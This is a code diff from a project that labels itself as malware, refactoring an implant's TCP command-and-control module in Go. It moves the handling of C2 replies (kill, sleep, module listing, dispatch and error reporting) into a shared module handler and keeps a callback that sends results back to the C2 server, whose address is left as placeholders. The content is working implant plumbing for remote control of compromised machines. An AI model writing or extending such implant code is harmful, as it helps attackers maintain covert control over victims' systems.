@@ -6,7 +6,6 @@ import (
 	"fmt"
 	"log"
 	"malware/common/messages"
-	"malware/common/types"
 	"malware/implant/included_modules"
 	"time"
 
@@ -26,6 +25,14 @@ type settings struct {
 	host  string
 }
 
+func (settings *settings) callback(msg *messages.CheckCmdRequest) {
+	client := messages.NewMalwareClient(settings.state.conn)
+	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
+	defer cancel()
+
+	client.CheckCommandQueue(ctx, msg)
+}
+
 // Initialise connection
 func (settings settings) doConnection() {
 	client := messages.NewMalwareClient(settings.state.conn)
@@ -38,48 +45,9 @@ func (settings settings) doConnection() {
 		return
 	}
 
-	// If a message doesn't contain a heartbeat we need to decode it
-	if reply.GetHeartbeat() != 0 {
-		return
-	}
-
-	if reply.GetKill() {
+	if included_modules.HandleMessage(reply, settings.callback) {
 		settings.state.running = false
-		return
 	}
-
-	if reply.GetSleep() != 0 {
-		time.Sleep(time.Duration(reply.GetSleep()) * time.Second)
-		return
-	}
-
-	// If message hasn't been handled yet, it is meant for one of the cores.
-	// We provide a callback function to abstract away replying to the C2
-	callback := func(msg *messages.CheckCmdRequest) {
-		client := messages.NewMalwareClient(settings.state.conn)
-		ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
-		defer cancel()
-
-		client.CheckCommandQueue(ctx, msg)
-	}
-
-	if reply.GetListmodules() {
-		modules := ""
-		for _, module := range included_modules.Modules {
-			modules += module.ID() + " "
-		}
-		callback(messages.Implant_data("list", []byte(modules)))
-		return
-	}
-
-	for _, module := range included_modules.Modules {
-		if module.HandleMessage(reply, callback) {
-			return // This message has been handled, no need to do anything more
-		}
-	}
-
-	// Message was not handled, send error message
-	callback(messages.Implant_error(settings.ID(), types.ERR_MODULE_NOT_IMPL))
 }
 
 func (settings settings) fixConnection() {
@@ -112,10 +80,6 @@ func (settings settings) listenServer() {
 	settings.state.conn.Close()
 }
 
-func (settings settings) HandleMessage(*messages.CheckCmdReply, func(*messages.CheckCmdRequest)) bool {
-	return false
-}
-
 func Init() {
 	port := int32(_C2_PORT_)
 	ip := "_C2_IP_"
@@ -126,8 +90,3 @@ func Init() {
 
 	settings.listenServer()
 }
-
-func (settings settings) Shutdown() {
-}
-
-func (settings) ID() string { return "basic_tcp" }
